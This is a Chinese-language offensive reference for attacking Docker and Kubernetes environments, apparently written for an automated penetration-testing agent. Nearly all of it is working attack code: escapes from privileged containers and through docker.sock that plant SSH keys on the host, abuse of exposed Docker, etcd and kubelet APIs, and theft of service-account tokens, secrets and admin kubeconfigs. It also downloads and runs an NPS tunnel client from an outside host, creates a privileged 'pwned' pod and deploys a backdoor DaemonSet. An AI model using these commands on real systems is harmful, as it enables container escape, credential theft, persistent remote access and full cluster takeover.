# 云原生攻击参考

## 1. 环境识别

### 1.1 容器检测

```python
# 判断当前是否在容器中
container_checks = {
    "cat /proc/1/cgroup 2>/dev/null | grep -iE 'docker|lxc|kubepods|containerd'": "cgroup 检测",
    "ls -la /.dockerenv 2>/dev/null": ".dockerenv 文件",
    "cat /proc/self/mountinfo 2>/dev/null | grep -iE 'docker|overlay'": "mountinfo 检测",
    "hostname": "容器通常为随机 hex 主机名",
    "cat /proc/1/sched 2>/dev/null | head -1": "PID 1 进程名（非 init/systemd 则可能为容器）",
    "fdisk -l 2>/dev/null": "无磁盘设备 = 容器",
}
for cmd, desc in container_checks.items():
    result = exec_cmd(cid, cmd)
    print(f"[*] {desc}: {result.strip()[:200]}")
```

### 1.2 Kubernetes 检测

```python
k8s_checks = {
    "echo $KUBERNETES_SERVICE_HOST": "K8s API Server 地址",
    "echo $KUBERNETES_SERVICE_PORT": "K8s API Server 端口",
    "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 80": "SA Token",
    "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null": "当前 Namespace",
    "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -3": "CA 证书",
    "ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null": "SA 挂载目录",
}
for cmd, desc in k8s_checks.items():
    result = exec_cmd(cid, cmd)
    if result.strip():
        print(f"[+] K8s 环境: {desc} = {result.strip()[:100]}")
```

---

## 2. Docker 利用

### 2.1 容器信息收集

```python
docker_info_cmds = [
    "cat /proc/1/cgroup",                    # cgroup 信息
    "cat /etc/hostname",                      # 容器 ID
    "ip a",                                   # 容器网络
    "cat /proc/self/status | grep Cap",       # 容器 capabilities
    "ls -la /var/run/docker.sock 2>/dev/null", # Docker socket
    "mount | grep -E 'proc|sys|dev'",         # 挂载情况
    "cat /proc/1/cmdline | tr '\\0' ' '",    # 容器启动命令
    "env",                                    # 环境变量（可能泄露密码/配置）
]
for cmd in docker_info_cmds:
    print(f"[*] {cmd}")
    print(exec_cmd(cid, cmd))
```

### 2.2 CDK 自动评估

CDK 是容器渗透的瑞士军刀，推荐优先使用。

```python
# 推送 CDK
push_tool(cid, "CDK/cdk_linux_amd64", "/tmp")
exec_cmd(cid, "chmod +x /tmp/cdk_linux_amd64")

# 自动评估（扫描所有可利用点）
result = exec_cmd(cid, "/tmp/cdk_linux_amd64 evaluate")
print(result)
# CDK evaluate 会检测：
# - 特权容器
# - docker.sock 挂载
# - 可利用的 capabilities
# - K8s SA Token 权限
# - 云 Metadata 可达性
# - 已知 CVE
```

### 2.3 逃逸路径

**特权容器逃逸**（最常见、最简单）：
```python
# 检测是否为特权容器
caps = exec_cmd(cid, "cat /proc/self/status | grep CapEff")
# CapEff 全 f (0000003fffffffff) = 特权容器

# CDK 特权容器逃逸
exec_cmd(cid, "/tmp/cdk_linux_amd64 run mount-disk")
# 或手动：挂载宿主机文件系统
exec_cmd(cid, "fdisk -l 2>/dev/null")  # 查看宿主磁盘
exec_cmd(cid, "mkdir -p /mnt/host && mount /dev/sda1 /mnt/host")
# 已挂载宿主 → 写 SSH key / crontab / 读取敏感文件
exec_cmd(cid, 'echo "ssh-rsa AAAA..." >> /mnt/host/root/.ssh/authorized_keys')
# 或通过 cgroup 逃逸执行宿主命令
```

**Docker Socket 挂载**：
```python
# 检测
exec_cmd(cid, "ls -la /var/run/docker.sock")
# 如果存在 → 完全控制 Docker Daemon

# 创建特权容器挂载宿主
exec_cmd(cid, 'curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head')
# 创建挂载宿主的容器
exec_cmd(cid, '''curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt sh -c \\"echo ssh-rsa AAAA... >> /root/.ssh/authorized_keys\\""],"Binds":["/:/mnt"],"Privileged":true}' ''')
```

**Capabilities 利用**：
```python
# CDK 自动检测可利用 capabilities
exec_cmd(cid, "/tmp/cdk_linux_amd64 run cap-check")
# CAP_SYS_ADMIN → mount cgroup 逃逸
# CAP_SYS_PTRACE → 进程注入
# CAP_DAC_READ_SEARCH → 读取宿主任意文件
# CAP_NET_ADMIN → 网络操作
```

**CVE 利用**：
| CVE | 组件 | 影响 | CDK 支持 |
|-----|------|------|----------|
| CVE-2019-5736 | runc < 1.0-rc6 | 覆写宿主 runc → 逃逸 | 是 |
| CVE-2020-15257 | containerd < 1.3.9 | host network + /proc → 逃逸 | 是 |
| CVE-2022-0847 | Linux 5.8+ | DirtyPipe 容器内→宿主 | 否(通用内核利用) |

### 2.4 Docker API 未授权 (2375)

从外部（其他主机）发现暴露的 Docker API：

```python
# 检测 Docker API
result = exec_cmd(cid, "curl -s --max-time 5 http://{target}:2375/info")
if '"ID"' in result:
    print("[+] Docker API 未授权访问！")

# 创建特权容器挂载宿主
exec_cmd(cid, f'''curl -s -X POST http://{target}:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true,"Tty":true,"OpenStdin":true}}'  ''')
# 获取容器 ID → start → exec → 操作宿主文件系统
```

### 2.5 逃逸后操作

逃逸到宿主机后立即：

1. **信息收集**：宿主机系统信息、网络信息
2. **NPS 上线**：宿主机上运行 npc
3. **Docker 信息**：`docker ps -a`、`docker network ls`、`docker inspect`
4. **其他容器**：扫描 Docker 网络（通常 172.17.0.0/16）
5. **K8s 检测**：宿主机是否是 K8s 节点

```python
# 逃逸后宿主机 NPS 上线
# 通过挂载的宿主文件系统写入并执行
exec_cmd(cid, "wget http://<NPS_IP>:8024/files/npc_linux_amd64 -O /mnt/host/tmp/npc")
exec_cmd(cid, "chmod +x /mnt/host/tmp/npc")
exec_cmd(cid, 'chroot /mnt/host /bin/sh -c "nohup /tmp/npc -server=<NPS_IP>:8024 -vkey=auto > /dev/null 2>&1 &"')
```

---

## 3. Kubernetes 利用

### 3.1 SA Token → API Server

```python
# 读取 ServiceAccount Token
sa_token = exec_cmd(cid, "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
api_server = exec_cmd(cid, "echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT")

# 测试 API 权限
k8s_cmds = [
    # 自身权限检查
    f'curl -sk -H "Authorization: Bearer {sa_token}" https://{api_server}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews -d \'{{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{{"resourceAttributes":{{"verb":"list","resource":"secrets"}}}}}}\'',
    # 列出 Pod
    f'curl -sk -H "Authorization: Bearer {sa_token}" https://{api_server}/api/v1/pods',
    # 列出 Secrets（高价值）
    f'curl -sk -H "Authorization: Bearer {sa_token}" https://{api_server}/api/v1/secrets',
    # 列出 ConfigMaps
    f'curl -sk -H "Authorization: Bearer {sa_token}" https://{api_server}/api/v1/configmaps',
    # 列出 Nodes
    f'curl -sk -H "Authorization: Bearer {sa_token}" https://{api_server}/api/v1/nodes',
]
```

### 3.2 K8s 提权

**创建特权 Pod**（如果有 create pods 权限）：
```python
pod_yaml = '''{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "pwned", "namespace": "default"},
  "spec": {
    "containers": [{
      "name": "pwned",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "apk add curl && curl http://<NPS_IP>:8024/files/npc_linux_amd64 -o /tmp/npc && chmod +x /tmp/npc && /tmp/npc -server=<NPS_IP>:8024 -vkey=auto"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name": "host", "mountPath": "/mnt/host"}]
    }],
    "volumes": [{"name": "host", "hostPath": {"path": "/", "type": "Directory"}}],
    "nodeName": "<target-node>"
  }
}'''
```

**读取 Secrets**（数据库密码、API Key、TLS 证书等）：
```python
exec_cmd(cid, f'curl -sk -H "Authorization: Bearer {sa_token}" https://{api_server}/api/v1/namespaces/default/secrets')
# Secrets 是 base64 编码，需要解码
```

### 3.3 CDK Kubernetes 模块

```python
# Secret 导出
exec_cmd(cid, "/tmp/cdk_linux_amd64 run k8s-secret-dump auto")

# ConfigMap 导出
exec_cmd(cid, "/tmp/cdk_linux_amd64 run k8s-configmap-dump auto")

# 部署后门 DaemonSet（在所有节点上运行）
exec_cmd(cid, "/tmp/cdk_linux_amd64 run k8s-backdoor-daemonset")

# ServiceAccount 权限检查
exec_cmd(cid, "/tmp/cdk_linux_amd64 run service-account-check")
```

### 3.4 etcd 未授权

etcd 存储所有 K8s 数据，未授权访问 = 集群完全控制。

```python
# 检测 etcd (2379)
result = exec_cmd(cid, "curl -s --max-time 5 http://{target}:2379/v2/keys/ 2>/dev/null")
if "nodes" in result or "key" in result:
    print("[+] etcd 未授权！")
    # 读取所有 K8s Secrets
    exec_cmd(cid, 'curl -s http://{target}:2379/v3/kv/range -d \'{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHQ="}\'')
```

### 3.5 Kubelet API

```python
# Kubelet 10250（需认证，但可能配置了匿名访问）
result = exec_cmd(cid, f"curl -sk https://{target}:10250/pods/")
if '"items"' in result:
    print("[+] Kubelet API 可访问！")
    # 在 Pod 中执行命令
    # curl -sk https://{target}:10250/run/{namespace}/{pod}/{container} -d "cmd=id"

# Kubelet 只读 10255（信息泄露）
result = exec_cmd(cid, f"curl -s http://{target}:10255/pods/")
if '"items"' in result:
    print("[+] Kubelet 只读端口可访问（信息泄露）")
```

---

## 4. 云服务利用

### 4.1 托管 K8s

```python
# 节点上通常可以获取 kubeconfig
kubeconfig_paths = [
    "/etc/kubernetes/admin.conf",
    "/etc/kubernetes/kubelet.conf",
    "/root/.kube/config",
    "/var/lib/kubelet/kubeconfig",
]
for path in kubeconfig_paths:
    result = exec_cmd(cid, f"cat {path} 2>/dev/null")
    if result.strip() and "No such file" not in result:
        print(f"[+] kubeconfig: {path}")
        download_file(cid, path, f"./kubeconfig_{path.replace('/', '_')}")
```

---

## 5. 横向移动

### 5.1 容器网络扫描

```python
# Docker 默认网络
exec_cmd(cid, "/tmp/fscan_linux_amd64 -h 172.17.0.0/16 -o /tmp/docker_scan.txt")
# K8s Pod 网络（通常 10.244.0.0/16 或 10.0.0.0/8）
exec_cmd(cid, "/tmp/fscan_linux_amd64 -h 10.244.0.0/16 -o /tmp/k8s_scan.txt")
# K8s Service 网络（通常 10.96.0.0/12）
exec_cmd(cid, "/tmp/fscan_linux_amd64 -h 10.96.0.0/12 -p 80,443,8080,3306,6379,27017 -o /tmp/svc_scan.txt")
```

### 5.2 Pod → Node 逃逸后 NPS 上线

逃逸到 Node 后参照 Linux 攻击参考（`references/linux.md`）处理，核心步骤：
1. NPS 上线
2. 信息收集（尤其是 kubelet 配置和其他节点信息）
3. 如果是 K8s Master → admin.conf → 完全控制集群

### 5.3 Node → Cluster

```python
# 通过 kubelet 凭据访问 API Server
exec_cmd(cid, "cat /etc/kubernetes/kubelet.conf 2>/dev/null")
# 或通过 bootstrap token
exec_cmd(cid, "cat /etc/kubernetes/bootstrap-kubelet.conf 2>/dev/null")
# 如果是 Master 节点
exec_cmd(cid, "cat /etc/kubernetes/admin.conf 2>/dev/null")
# admin.conf = 集群管理员权限 → 完全控制
```
